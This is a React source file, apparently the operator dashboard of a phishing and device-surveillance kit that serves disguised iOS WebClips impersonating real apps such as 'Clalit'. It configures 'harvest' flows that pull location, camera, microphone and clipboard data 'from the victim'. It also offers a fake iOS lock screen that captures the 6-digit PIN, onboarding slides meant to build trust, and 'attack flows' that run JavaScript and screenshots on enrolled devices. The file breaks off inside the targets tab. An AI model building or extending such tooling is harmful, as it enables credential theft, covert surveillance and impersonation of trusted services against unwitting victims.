import React, { useState, useEffect, useCallback, useRef } from 'react';
import { apiFetch } from '../api/client.js';
import { C, S } from '../theme.jsx';

// ─── Style helpers ──────────────────────────────────────────────────────────

const sans = C.sans;
const mono = C.mono;

const inp = {
  background: C.surface2,
  border: `1px solid ${C.borderMd}`,
  borderRadius: 6,
  padding: '7px 10px',
  fontSize: 13,
  color: C.text,
  outline: 'none',
  fontFamily: sans,
  width: '100%',
  boxSizing: 'border-box',
};

const labelSt = {
  display: 'block',
  fontSize: 10,
  fontWeight: 700,
  letterSpacing: '0.09em',
  textTransform: 'uppercase',
  color: C.text2,
  marginBottom: 5,
  marginTop: 12,
};

function PrimaryBtn({ onClick, disabled, children, style }) {
  return (
    <button
      onClick={onClick}
      disabled={disabled}
      style={{
        height: 30,
        padding: '0 14px',
        borderRadius: 6,
        border: 'none',
        background: disabled ? C.surface3 : C.accent,
        color: '#fff',
        fontSize: 12,
        fontWeight: 600,
        cursor: disabled ? 'default' : 'pointer',
        opacity: disabled ? 0.5 : 1,
        fontFamily: sans,
        whiteSpace: 'nowrap',
        ...style,
      }}
    >
      {children}
    </button>
  );
}

function GhostBtn({ onClick, disabled, children, style }) {
  return (
    <button
      onClick={onClick}
      disabled={disabled}
      style={{
        height: 30,
        padding: '0 12px',
        borderRadius: 6,
        border: `1px solid ${C.borderMd}`,
        background: 'transparent',
        color: disabled ? C.text2 : C.text,
        fontSize: 12,
        fontWeight: 400,
        cursor: disabled ? 'default' : 'pointer',
        fontFamily: sans,
        whiteSpace: 'nowrap',
        opacity: disabled ? 0.5 : 1,
        ...style,
      }}
    >
      {children}
    </button>
  );
}

function DangerBtn({ onClick, disabled, children, style }) {
  return (
    <button
      onClick={onClick}
      disabled={disabled}
      style={{
        height: 28,
        padding: '0 10px',
        borderRadius: 5,
        border: `1px solid rgba(239,68,68,0.3)`,
        background: 'transparent',
        color: disabled ? C.text2 : C.red,
        fontSize: 11,
        fontWeight: 600,
        cursor: disabled ? 'default' : 'pointer',
        fontFamily: sans,
        whiteSpace: 'nowrap',
        opacity: disabled ? 0.5 : 1,
        ...style,
      }}
    >
      {children}
    </button>
  );
}

function FieldInput({ label, value, onChange, type, placeholder, mono: isMono, style }) {
  return (
    <div>
      {label && <label style={labelSt}>{label}</label>}
      <input
        type={type || 'text'}
        value={value}
        onChange={e => onChange(e.target.value)}
        placeholder={placeholder || ''}
        style={{ ...inp, ...(isMono ? { fontFamily: mono } : {}), ...style }}
      />
    </div>
  );
}

function FieldTextarea({ label, value, onChange, rows, placeholder }) {
  return (
    <div>
      {label && <label style={labelSt}>{label}</label>}
      <textarea
        value={value}
        onChange={e => onChange(e.target.value)}
        rows={rows || 4}
        placeholder={placeholder || ''}
        style={{ ...inp, resize: 'vertical' }}
      />
    </div>
  );
}

function FieldColor({ label, value, onChange }) {
  return (
    <div>
      {label && <label style={labelSt}>{label}</label>}
      <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
        <input
          type="color"
          value={value || '#007aff'}
          onChange={e => onChange(e.target.value)}
          style={{ width: 36, height: 30, border: 'none', background: 'none', cursor: 'pointer', borderRadius: 4 }}
        />
        <span style={{ fontSize: 12, color: C.text2, fontFamily: mono }}>{value || '#007aff'}</span>
        <input
          type="text"
          value={value || ''}
          onChange={e => onChange(e.target.value)}
          style={{ ...inp, width: 100, fontSize: 12, fontFamily: mono }}
          placeholder="#007aff"
        />
      </div>
    </div>
  );
}

function Toggle({ checked, onChange, label }) {
  return (
    <label style={{ display: 'flex', alignItems: 'center', gap: 10, cursor: 'pointer', userSelect: 'none' }}>
      <div
        onClick={() => onChange(!checked)}
        style={{
          width: 36,
          height: 20,
          borderRadius: 10,
          background: checked ? C.accent : C.surface3,
          border: `1px solid ${checked ? C.accent : C.borderMd}`,
          position: 'relative',
          transition: 'background 0.15s',
          cursor: 'pointer',
          flexShrink: 0,
        }}
      >
        <div style={{
          position: 'absolute',
          top: 2,
          left: checked ? 18 : 2,
          width: 14,
          height: 14,
          borderRadius: 7,
          background: '#fff',
          transition: 'left 0.15s',
        }} />
      </div>
      {label && <span style={{ fontSize: 13, color: C.text }}>{label}</span>}
    </label>
  );
}

function SectionNote({ children }) {
  return (
    <div style={{
      background: C.surface3,
      border: `1px solid ${C.borderMd}`,
      borderRadius: 6,
      padding: '8px 12px',
      fontSize: 12,
      color: C.text2,
      marginTop: 10,
      lineHeight: 1.5,
    }}>
      {children}
    </div>
  );
}

// ─── Default template fields ────────────────────────────────────────────────

function defaultTemplate(partial) {
  return {
    name: '',
    is_default: false,
    app_name: '',
    app_icon_b64: '',
    ui_type: 'white',
    ui_html: '',
    theme: {},
    splash: { enabled: false, title: '', subtitle: '', duration: 1800, bg: '#ffffff', accent: '#007aff' },
    install_page: { title: 'Install App', body: 'Tap below to install', btn_label: 'Install', bg: '#f2f2f7', accent: '#007aff' },
    onboarding: [],
    harvest: [],
    ...partial,
  };
}

function defaultHarvestItem() {
  return {
    id: `h${Date.now()}`,
    permission: 'geolocation',
    title: '',
    body: '',
    trigger: 'auto',
    delay_ms: 0,
  };
}

function defaultFlowStep() {
  return {
    id: `s${Date.now()}`,
    command: '',
    payload: '{}',
    delay_ms: 0,
    label: '',
  };
}

// ─── Tab: Identity ──────────────────────────────────────────────────────────

function TabIdentity({ tpl, onChange }) {
  const fileRef = useRef(null);

  function handleIconFile(e) {
    const file = e.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = ev => onChange({ ...tpl, app_icon_b64: ev.target.result });
    reader.readAsDataURL(file);
  }

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
      <FieldInput label="Template Name" value={tpl.name} onChange={v => onChange({ ...tpl, name: v })} placeholder="My Template" />
      <FieldInput label="App Name (shown on home screen)" value={tpl.app_name} onChange={v => onChange({ ...tpl, app_name: v })} placeholder="Clalit" />

      <label style={labelSt}>App Icon</label>
      <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
        {tpl.app_icon_b64 ? (
          <img src={tpl.app_icon_b64} alt="icon" style={{ width: 52, height: 52, borderRadius: 12, border: `1px solid ${C.borderMd}`, objectFit: 'cover' }} />
        ) : (
          <div style={{ width: 52, height: 52, borderRadius: 12, border: `1px solid ${C.borderMd}`, background: C.surface3, display: 'flex', alignItems: 'center', justifyContent: 'center', color: C.text2, fontSize: 11 }}>
            no icon
          </div>
        )}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
          <GhostBtn onClick={() => fileRef.current?.click()}>Upload PNG/JPG</GhostBtn>
          {tpl.app_icon_b64 && (
            <DangerBtn onClick={() => onChange({ ...tpl, app_icon_b64: '' })}>Remove</DangerBtn>
          )}
        </div>
        <input ref={fileRef} type="file" accept="image/*" style={{ display: 'none' }} onChange={handleIconFile} />
      </div>
      <SectionNote>Paste a base64 data URL below to set the icon directly (e.g. from the Cloner).</SectionNote>
      <FieldTextarea
        label="Icon Base64 (optional paste)"
        value={tpl.app_icon_b64}
        onChange={v => onChange({ ...tpl, app_icon_b64: v })}
        rows={3}
        placeholder="data:image/png;base64,..."
      />

      <div style={{ marginTop: 14 }}>
        <Toggle
          checked={!!tpl.is_default}
          onChange={v => onChange({ ...tpl, is_default: v })}
          label="Set as default template (new targets get this automatically)"
        />
      </div>
    </div>
  );
}

// ─── Tab: UI ────────────────────────────────────────────────────────────────

const UI_TYPES = [
  { value: 'white', label: 'White', note: 'Blank white page. Fast load, minimal fingerprint.' },
  { value: 'spinner', label: 'Spinner', note: 'Animated loading spinner. Buys time for harvest flows to fire.' },
  { value: 'builtin', label: 'Built-in', note: 'Server-rendered page using install_page config. Default portal UI.' },
  { value: 'html', label: 'Custom HTML', note: 'Full custom HTML/JS injected into the page. You control everything.' },
];

function TabUI({ tpl, onChange }) {
  return (
    <div>
      <label style={labelSt}>UI Mode</label>
      <div style={{ display: 'flex', flexDirection: 'column', gap: 8, marginTop: 4 }}>
        {UI_TYPES.map(t => (
          <label key={t.value} style={{ display: 'flex', alignItems: 'flex-start', gap: 10, cursor: 'pointer', padding: '10px 12px', borderRadius: 6, border: `1px solid ${tpl.ui_type === t.value ? C.borderHi : C.borderMd}`, background: tpl.ui_type === t.value ? C.accentBg : 'transparent' }}>
            <input
              type="radio"
              checked={tpl.ui_type === t.value}
              onChange={() => onChange({ ...tpl, ui_type: t.value })}
              style={{ accentColor: C.accent, marginTop: 2, flexShrink: 0 }}
            />
            <div>
              <div style={{ fontSize: 13, fontWeight: 600, color: C.text }}>{t.label}</div>
              <div style={{ fontSize: 12, color: C.text2, marginTop: 2 }}>{t.note}</div>
            </div>
          </label>
        ))}
      </div>
      {tpl.ui_type === 'html' && (
        <div style={{ marginTop: 14 }}>
          <FieldTextarea
            label="Custom HTML"
            value={tpl.ui_html || ''}
            onChange={v => onChange({ ...tpl, ui_html: v })}
            rows={14}
            placeholder="<!DOCTYPE html><html>..."
          />
          <SectionNote>The HTML is served at the WebClip URL. Harvest flows run as JS injected before the closing body tag. You can reference window.__harvest__ for status.</SectionNote>
        </div>
      )}
    </div>
  );
}

// ─── Tab: Splash ────────────────────────────────────────────────────────────

function TabSplash({ tpl, onChange }) {
  const sp = tpl.splash || {};
  function set(key, val) {
    onChange({ ...tpl, splash: { ...sp, [key]: val } });
  }

  return (
    <div>
      <Toggle checked={!!sp.enabled} onChange={v => set('enabled', v)} label="Show splash screen on load" />
      {sp.enabled && (
        <div style={{ marginTop: 14, display: 'flex', flexDirection: 'column', gap: 4 }}>
          <FieldInput label="Title" value={sp.title || ''} onChange={v => set('title', v)} placeholder="Loading..." />
          <FieldInput label="Subtitle" value={sp.subtitle || ''} onChange={v => set('subtitle', v)} placeholder="Please wait" />
          <FieldInput
            label="Duration (ms)"
            type="number"
            value={sp.duration ?? 1800}
            onChange={v => set('duration', parseInt(v) || 1800)}
            style={{ width: 120 }}
          />
          <FieldColor label="Background Color" value={sp.bg || '#ffffff'} onChange={v => set('bg', v)} />
          <FieldColor label="Accent Color" value={sp.accent || '#007aff'} onChange={v => set('accent', v)} />
        </div>
      )}
      {!sp.enabled && (
        <SectionNote style={{ marginTop: 12 }}>Splash is disabled. The WebClip page loads immediately.</SectionNote>
      )}
    </div>
  );
}

// ─── Tab: Install Page ──────────────────────────────────────────────────────

function TabInstall({ tpl, onChange, targets, baseUrl }) {
  const ip = tpl.install_page || {};
  function set(key, val) {
    onChange({ ...tpl, install_page: { ...ip, [key]: val } });
  }

  return (
    <div>
      <FieldInput label="Page Title" value={ip.title || ''} onChange={v => set('title', v)} placeholder="Install App" />
      <FieldTextarea label="Body Text" value={ip.body || ''} onChange={v => set('body', v)} placeholder="Tap below to install" rows={3} />
      <FieldInput label="Button Label" value={ip.btn_label || ''} onChange={v => set('btn_label', v)} placeholder="Install" />
      <FieldColor label="Background Color" value={ip.bg || '#f2f2f7'} onChange={v => set('bg', v)} />
      <FieldColor label="Accent Color" value={ip.accent || '#007aff'} onChange={v => set('accent', v)} />

      <div style={{ marginTop: 18 }}>
        <label style={labelSt}>Download URL Format</label>
        <div style={{
          background: C.surface3,
          border: `1px solid ${C.borderMd}`,
          borderRadius: 6,
          padding: '8px 12px',
          fontFamily: mono,
          fontSize: 12,
          color: C.text2,
          wordBreak: 'break-all',
        }}>
          {baseUrl}/install/[TOKEN]
        </div>
      </div>

      {targets && targets.length > 0 && (
        <div style={{ marginTop: 18 }}>
          <label style={labelSt}>Target URLs</label>
          {targets.map(t => (
            <div key={t.id} style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 6 }}>
              <span style={{ fontSize: 12, color: C.text2, minWidth: 80 }}>{t.label || t.token.slice(0, 8)}</span>
              <div style={{
                flex: 1,
                background: C.surface3,
                border: `1px solid ${C.borderMd}`,
                borderRadius: 5,
                padding: '5px 8px',
                fontFamily: mono,
                fontSize: 11,
                color: C.text2,
                wordBreak: 'break-all',
              }}>
                {baseUrl}/install/{t.token}
              </div>
              <GhostBtn
                style={{ height: 26, fontSize: 11 }}
                onClick={() => navigator.clipboard?.writeText(`${baseUrl}/install/${t.token}`)}
              >
                Copy
              </GhostBtn>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

// ─── Tab: Harvest ───────────────────────────────────────────────────────────

const PERMISSIONS = [
  { value: 'geolocation',    label: 'Location (GPS)' },
  { value: 'camera',         label: 'Camera' },
  { value: 'microphone',     label: 'Microphone' },
  { value: 'notifications',  label: 'Notifications' },
  { value: 'clipboard-read', label: 'Clipboard' },
  { value: 'pin_capture',    label: 'PIN Code Capture (Fake Lock Screen)' },
];

function HarvestItem({ item, onChange, onRemove, onDragStart, onDragOver, onDrop, isDragging }) {
  const isPinCapture = item.permission === 'pin_capture';
  return (
    <div
      draggable
      onDragStart={onDragStart}
      onDragOver={e => { e.preventDefault(); onDragOver(); }}
      onDrop={onDrop}
      style={{
        background: isPinCapture ? 'rgba(255,59,48,0.06)' : C.surface2,
        border: `1px solid ${isPinCapture ? 'rgba(255,59,48,0.3)' : C.borderMd}`,
        borderRadius: 7,
        padding: '12px 14px',
        marginBottom: 10,
        opacity: isDragging ? 0.4 : 1,
        cursor: 'grab',
      }}
    >
      {isPinCapture && (
        <div style={{ fontSize: 11, color: '#ff3b30', fontWeight: 600, marginBottom: 8, display: 'flex', alignItems: 'center', gap: 6 }}>
          <span>&#128274;</span> Fake iOS Lock Screen — captures 6-digit PIN
        </div>
      )}
      <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 10 }}>
        <span style={{ color: C.text2, fontSize: 13, cursor: 'grab', userSelect: 'none' }}>::</span>
        <select
          value={item.permission}
          onChange={e => onChange({ ...item, permission: e.target.value })}
          style={{ ...inp, width: 220, fontSize: 12 }}
        >
          {PERMISSIONS.map(p => <option key={p.value} value={p.value}>{p.label}</option>)}
        </select>
        <div style={{ display: 'flex', gap: 6, marginLeft: 'auto' }}>
          <select
            value={item.trigger}
            onChange={e => onChange({ ...item, trigger: e.target.value })}
            style={{ ...inp, width: 90, fontSize: 12 }}
          >
            <option value="auto">auto</option>
            <option value="manual">manual</option>
          </select>
          <DangerBtn onClick={onRemove}>Remove</DangerBtn>
        </div>
      </div>
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8, marginBottom: 8 }}>
        <FieldInput label="Title" value={item.title} onChange={v => onChange({ ...item, title: v })} placeholder="Enable Location" />
        <FieldInput
          label="Delay (ms)"
          type="number"
          value={item.delay_ms}
          onChange={v => onChange({ ...item, delay_ms: parseInt(v) || 0 })}
          placeholder="0"
        />
      </div>
      <FieldTextarea
        label="Body"
        value={item.body}
        onChange={v => onChange({ ...item, body: v })}
        rows={2}
        placeholder="This app needs your location to show nearby alerts."
      />
    </div>
  );
}

function TabHarvest({ tpl, onChange }) {
  const harvest = tpl.harvest || [];
  const [dragIdx, setDragIdx] = useState(null);
  const [overIdx, setOverIdx] = useState(null);

  function addItem() {
    onChange({ ...tpl, harvest: [...harvest, defaultHarvestItem()] });
  }

  function updateItem(idx, updated) {
    const next = [...harvest];
    next[idx] = updated;
    onChange({ ...tpl, harvest: next });
  }

  function removeItem(idx) {
    const next = harvest.filter((_, i) => i !== idx);
    onChange({ ...tpl, harvest: next });
  }

  function handleDrop(dropIdx) {
    if (dragIdx === null || dragIdx === dropIdx) return;
    const next = [...harvest];
    const [moved] = next.splice(dragIdx, 1);
    next.splice(dropIdx, 0, moved);
    onChange({ ...tpl, harvest: next });
    setDragIdx(null);
    setOverIdx(null);
  }

  return (
    <div>
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 12 }}>
        <span style={{ fontSize: 13, color: C.text }}>{harvest.length} harvest flow{harvest.length !== 1 ? 's' : ''}</span>
        <PrimaryBtn onClick={addItem}>+ Add Flow</PrimaryBtn>
      </div>
      {harvest.length === 0 && (
        <SectionNote>No harvest flows defined. Add one to request permissions from the victim.</SectionNote>
      )}
      {harvest.map((item, idx) => (
        <HarvestItem
          key={item.id}
          item={item}
          onChange={updated => updateItem(idx, updated)}
          onRemove={() => removeItem(idx)}
          onDragStart={() => setDragIdx(idx)}
          onDragOver={() => setOverIdx(idx)}
          onDrop={() => handleDrop(idx)}
          isDragging={dragIdx === idx}
        />
      ))}
    </div>
  );
}

// ─── Tab: Flows ─────────────────────────────────────────────────────────────

const COMMON_COMMANDS = [
  'capture_geo', 'capture_screenshot', 'run_js', 'open_url',
  'send_notification', 'read_clipboard', 'get_device_info', 'custom',
];

function FlowStepRow({ step, onChange, onRemove, onDragStart, onDragOver, onDrop, isDragging }) {
  const [showPayload, setShowPayload] = useState(false);
  return (
    <div
      draggable
      onDragStart={onDragStart}
      onDragOver={e => { e.preventDefault(); onDragOver(); }}
      onDrop={onDrop}
      style={{
        background: C.surface2,
        border: `1px solid ${C.borderMd}`,
        borderRadius: 6,
        padding: '10px 12px',
        marginBottom: 8,
        opacity: isDragging ? 0.4 : 1,
        cursor: 'grab',
      }}
    >
      <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
        <span style={{ color: C.text2, fontSize: 13, cursor: 'grab', userSelect: 'none' }}>::</span>
        <select
          value={COMMON_COMMANDS.includes(step.command) ? step.command : 'custom'}
          onChange={e => {
            if (e.target.value === 'custom') return;
            onChange({ ...step, command: e.target.value });
          }}
          style={{ ...inp, width: 160, fontSize: 12 }}
        >
          {COMMON_COMMANDS.map(c => <option key={c} value={c}>{c}</option>)}
        </select>
        <input
          value={step.command}
          onChange={e => onChange({ ...step, command: e.target.value })}
          placeholder="command"
          style={{ ...inp, fontSize: 12, flex: 1 }}
        />
        <input
          value={step.label}
          onChange={e => onChange({ ...step, label: e.target.value })}
          placeholder="label"
          style={{ ...inp, fontSize: 12, width: 120 }}
        />
        <input
          type="number"
          value={step.delay_ms}
          onChange={e => onChange({ ...step, delay_ms: parseInt(e.target.value) || 0 })}
          placeholder="0ms"
          style={{ ...inp, fontSize: 12, width: 70 }}
        />
        <GhostBtn style={{ height: 26, fontSize: 11 }} onClick={() => setShowPayload(p => !p)}>
          {showPayload ? 'Hide' : 'Payload'}
        </GhostBtn>
        <DangerBtn onClick={onRemove}>x</DangerBtn>
      </div>
      {showPayload && (
        <div style={{ marginTop: 8 }}>
          <textarea
            value={typeof step.payload === 'string' ? step.payload : JSON.stringify(step.payload, null, 2)}
            onChange={e => onChange({ ...step, payload: e.target.value })}
            rows={3}
            style={{ ...inp, fontFamily: mono, fontSize: 12, resize: 'vertical' }}
            placeholder="{}"
          />
        </div>
      )}
    </div>
  );
}

function FlowEditor({ flow, onSave, onDelete, devices }) {
  const [name, setName] = useState(flow.name || '');
  const [steps, setSteps] = useState(() => (flow.steps || []).map(s => ({ ...s, payload: typeof s.payload === 'object' ? JSON.stringify(s.payload, null, 2) : (s.payload || '{}') })));
  const [dragIdx, setDragIdx] = useState(null);
  const [saving, setSaving] = useState(false);
  const [runDevice, setRunDevice] = useState('');
  const [runStatus, setRunStatus] = useState('');

  useEffect(() => {
    setName(flow.name || '');
    setSteps((flow.steps || []).map(s => ({ ...s, payload: typeof s.payload === 'object' ? JSON.stringify(s.payload, null, 2) : (s.payload || '{}') })));
  }, [flow.id]);

  function addStep() {
    setSteps(prev => [...prev, defaultFlowStep()]);
  }

  function updateStep(idx, updated) {
    setSteps(prev => { const n = [...prev]; n[idx] = updated; return n; });
  }

  function removeStep(idx) {
    setSteps(prev => prev.filter((_, i) => i !== idx));
  }

  function handleDrop(dropIdx) {
    if (dragIdx === null || dragIdx === dropIdx) return;
    setSteps(prev => {
      const n = [...prev];
      const [m] = n.splice(dragIdx, 1);
      n.splice(dropIdx, 0, m);
      return n;
    });
    setDragIdx(null);
  }

  async function handleSave() {
    setSaving(true);
    try {
      const parsedSteps = steps.map(s => {
        let payload = s.payload;
        try { payload = JSON.parse(s.payload); } catch (_) { payload = {}; }
        return { ...s, payload };
      });
      await onSave({ ...flow, name, steps: parsedSteps });
    } finally {
      setSaving(false);
    }
  }

  async function handleRun() {
    if (!runDevice) return;
    try {
      setRunStatus('Running...');
      await apiFetch(`/api/wc/flows/${flow.id}/run/${runDevice}`, { method: 'POST' });
      setRunStatus('Queued.');
      setTimeout(() => setRunStatus(''), 2500);
    } catch (e) {
      setRunStatus(`Error: ${e.message}`);
    }
  }

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 0, height: '100%' }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 12 }}>
        <input
          value={name}
          onChange={e => setName(e.target.value)}
          placeholder="Flow name"
          style={{ ...inp, fontSize: 14, fontWeight: 600, flex: 1 }}
        />
        <PrimaryBtn onClick={handleSave} disabled={saving}>{saving ? 'Saving...' : 'Save Flow'}</PrimaryBtn>
        <DangerBtn onClick={() => { if (window.confirm('Delete this flow?')) onDelete(flow.id); }}>Delete</DangerBtn>
      </div>

      <div style={{ flex: 1, overflowY: 'auto' }}>
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 8 }}>
          <span style={{ fontSize: 11, color: C.text2, textTransform: 'uppercase', letterSpacing: '0.08em', fontWeight: 700 }}>Steps</span>
          <GhostBtn style={{ height: 26, fontSize: 11 }} onClick={addStep}>+ Add Step</GhostBtn>
        </div>
        {steps.length === 0 && (
          <SectionNote>No steps. Add one to build an attack flow.</SectionNote>
        )}
        {steps.map((step, idx) => (
          <FlowStepRow
            key={step.id}
            step={step}
            onChange={u => updateStep(idx, u)}
            onRemove={() => removeStep(idx)}
            onDragStart={() => setDragIdx(idx)}
            onDragOver={() => {}}
            onDrop={() => handleDrop(idx)}
            isDragging={dragIdx === idx}
          />
        ))}
      </div>

      <div style={{ borderTop: `1px solid ${C.border}`, paddingTop: 12, marginTop: 10, display: 'flex', alignItems: 'center', gap: 8 }}>
        <span style={{ fontSize: 12, color: C.text2 }}>Run on device:</span>
        <select
          value={runDevice}
          onChange={e => setRunDevice(e.target.value)}
          style={{ ...inp, width: 180, fontSize: 12 }}
        >
          <option value="">Select device...</option>
          {(devices || []).map(d => <option key={d.id} value={d.id}>{d.name || d.id}</option>)}
        </select>
        <PrimaryBtn onClick={handleRun} disabled={!runDevice || !flow.id}>Run</PrimaryBtn>
        {runStatus && <span style={{ fontSize: 12, color: C.green }}>{runStatus}</span>}
      </div>
    </div>
  );
}

// ─── Tab: Onboarding ────────────────────────────────────────────────────────

function TabOnboarding({ tpl, onChange }) {
  const steps = tpl.onboarding || [];

  function addStep() {
    const next = [...steps, { id: `ob${Date.now()}`, title: '', body: '', icon: '⭐' }];
    onChange({ ...tpl, onboarding: next });
  }

  function updateStep(idx, patch) {
    const next = steps.map((s, i) => i === idx ? { ...s, ...patch } : s);
    onChange({ ...tpl, onboarding: next });
  }

  function removeStep(idx) {
    onChange({ ...tpl, onboarding: steps.filter((_, i) => i !== idx) });
  }

  return (
    <div>
      <SectionNote>
        Onboarding slides shown to the user before the main UI loads. Use to build trust before requesting permissions.
      </SectionNote>

      {steps.length === 0 && (
        <div style={{ textAlign: 'center', padding: '24px 0', color: C.text2, fontSize: 13 }}>
          No onboarding steps. Add one below.
        </div>
      )}

      {steps.map((step, idx) => (
        <div key={step.id || idx} style={{
          background: C.surface2, border: `1px solid ${C.borderMd}`,
          borderRadius: 7, padding: '12px 14px', marginBottom: 10,
        }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 10 }}>
            <span style={{ color: C.text2, fontSize: 12, fontWeight: 700, minWidth: 24 }}>#{idx + 1}</span>
            <FieldInput
              label="" value={step.icon || ''}
              onChange={v => updateStep(idx, { icon: v })}
              placeholder="⭐"
              style={{ width: 56, textAlign: 'center', fontSize: 22 }}
            />
            <div style={{ flex: 1 }}>
              <FieldInput label="" value={step.title} onChange={v => updateStep(idx, { title: v })} placeholder="Step title" />
            </div>
            <DangerBtn onClick={() => removeStep(idx)}>Remove</DangerBtn>
          </div>
          <FieldTextarea label="Body" value={step.body} onChange={v => updateStep(idx, { body: v })} rows={2} placeholder="Explain what this step does..." />
        </div>
      ))}

      <PrimaryBtn onClick={addStep} style={{ marginTop: 8 }}>+ Add Step</PrimaryBtn>
    </div>
  );
}

function TabFlows({ devices }) {
  const [flows, setFlows] = useState([]);
  const [selectedFlowId, setSelectedFlowId] = useState(null);
  const [loading, setLoading] = useState(true);
  const [newFlowName, setNewFlowName] = useState('');
  const [creating, setCreating] = useState(false);

  useEffect(() => {
    setLoading(true);
    apiFetch('/api/wc/flows')
      .then(data => { setFlows(data || []); if (data && data.length > 0 && !selectedFlowId) setSelectedFlowId(data[0].id); })
      .catch(() => {})
      .finally(() => setLoading(false));
  }, []);

  async function createFlow() {
    if (!newFlowName.trim()) return;
    setCreating(true);
    try {
      const created = await apiFetch('/api/wc/flows', { method: 'POST', body: JSON.stringify({ name: newFlowName, steps: [] }) });
      setFlows(prev => [...prev, created]);
      setSelectedFlowId(created.id);
      setNewFlowName('');
    } catch (e) {
      alert(`Create failed: ${e.message}`);
    } finally {
      setCreating(false);
    }
  }

  async function saveFlow(updated) {
    try {
      await apiFetch(`/api/wc/flows/${updated.id}`, { method: 'PUT', body: JSON.stringify({ name: updated.name, steps: updated.steps }) });
      setFlows(prev => prev.map(f => f.id === updated.id ? updated : f));
    } catch (e) {
      alert(`Save failed: ${e.message}`);
    }
  }

  async function deleteFlow(id) {
    try {
      await apiFetch(`/api/wc/flows/${id}`, { method: 'DELETE' });
      setFlows(prev => prev.filter(f => f.id !== id));
      setSelectedFlowId(flows.filter(f => f.id !== id)[0]?.id ?? null);
    } catch (e) {
      alert(`Delete failed: ${e.message}`);
    }
  }

  const selectedFlow = flows.find(f => f.id === selectedFlowId) || null;

  if (loading) return <div style={{ color: C.text2, fontSize: 13 }}>Loading flows...</div>;

  return (
    <div style={{ display: 'flex', gap: 16, height: '100%' }}>
      <div style={{ width: 200, flexShrink: 0, display: 'flex', flexDirection: 'column', gap: 8 }}>
        <div style={{ fontSize: 11, color: C.text2, textTransform: 'uppercase', letterSpacing: '0.08em', fontWeight: 700, marginBottom: 4 }}>Attack Flows</div>
        <div style={{ flex: 1, overflowY: 'auto' }}>
          {flows.map(f => (
            <div
              key={f.id}
              onClick={() => setSelectedFlowId(f.id)}
              style={{
                padding: '8px 10px',
                borderRadius: 6,
                border: `1px solid ${f.id === selectedFlowId ? C.borderHi : C.borderMd}`,
                background: f.id === selectedFlowId ? C.accentBg : 'transparent',
                cursor: 'pointer',
                fontSize: 13,
                color: C.text,
                marginBottom: 4,
              }}
            >
              {f.name || `Flow ${f.id}`}
            </div>
          ))}
          {flows.length === 0 && <div style={{ fontSize: 12, color: C.text2 }}>No flows yet.</div>}
        </div>
        <div style={{ borderTop: `1px solid ${C.border}`, paddingTop: 10 }}>
          <input
            value={newFlowName}
            onChange={e => setNewFlowName(e.target.value)}
            onKeyDown={e => e.key === 'Enter' && createFlow()}
            placeholder="New flow name..."
            style={{ ...inp, fontSize: 12, marginBottom: 6 }}
          />
          <PrimaryBtn onClick={createFlow} disabled={creating || !newFlowName.trim()} style={{ width: '100%' }}>
            {creating ? 'Creating...' : '+ New Flow'}
          </PrimaryBtn>
        </div>
      </div>

      <div style={{ flex: 1, minWidth: 0, overflowY: 'auto' }}>
        {selectedFlow ? (
          <FlowEditor flow={selectedFlow} onSave={saveFlow} onDelete={deleteFlow} devices={devices} />
        ) : (
          <SectionNote>Select or create a flow to edit it.</SectionNote>
        )}
      </div>
    </div>
  );
}

// ─── Tab: Targets ───────────────────────────────────────────────────────────

function TabTargets({ tplId, baseUrl }) {
  const [targets, setTargets] = useState([]);
  const [devices, setDevices] = useState([]);
  const [loading, setLoading] = useState(true);
  const [newLabel, setNewLabel] = useState('');
  const [creating, setCreating] = useState(false);
  const [linkDeviceId, setLinkDeviceId] = useState('');
  const [linking, setLinking] = useState(false);

  useEffect(() => {
    if (!tplId) return;
    setLoading(true);
    Promise.all([
      apiFetch('/api/wc/targets'),
      apiFetch('/api/devices/'),
    ]).then(([tgts, devs]) => {
      setTargets((tgts || []).filter(t => t.template_id === tplId));
      setDevices(devs || []);
    }).catch(() => {}).finally(() => setLoading(false));
  }, [tplId]);

  async function createTarget() {
    if (!newLabel.trim()) return;
    setCreating(true);
    try {
      const created = await apiFetch('/api/wc/targets', { method: 'POST', body: JSON.stringify({ label: newLabel, template_id: tplId }) });
      setTargets(prev => [...prev, created]);
      setNewLabel('');
    } catch (e) {
      alert(`Create failed: ${e.message}`);
    } finally {
      setCreating(false);
    }
  }

  async function linkActiveDevice() {
    if (!linkDeviceId) return;
    setLinking(true);
    try {
      const devId = parseInt(linkDeviceId);
      const dev = devices.find(d => d.id === devId);
      const label = dev?.name || `Device ${devId}`;
      // Check if target already exists for this device+template
      const existing = targets.find(t => t.device_id === devId);
      if (existing) {
        alert(`Device "${label}" is already linked to this template (target: ${existing.label || existing.token.slice(0,8)})`);
        return;
      }
      const created = await apiFetch('/api/wc/targets', {
        method: 'POST',
        body: JSON.stringify({ label, template_id: tplId }),
      });
      // Immediately link to device via link-token endpoint
      await apiFetch('/api/wc/link-token', {
        method: 'POST',
        body: JSON.stringify({ token: created.token, device_id: devId }),
      }).catch(() => {});
      // Also PATCH the target to set device_id
      const updated = await apiFetch(`/api/wc/targets/${created.id}`, {
        method: 'PATCH',
        body: JSON.stringify({ device_id: devId }),
      });
      setTargets(prev => [...prev, updated]);
      setLinkDeviceId('');
    } catch (e) {
      alert(`Link failed: ${e.message}`);
    } finally {
      setLinking(false);
    }
  }

  async function deleteTarget(id) {
    if (!window.confirm('Delete this target?')) return;
    try {
      await apiFetch(`/api/wc/targets/${id}`, { method: 'DELETE' });
      setTargets(prev => prev.filter(t => t.id !== id));
    } catch (e) {
      alert(`Delete failed: ${e.message}`);
    }
  }

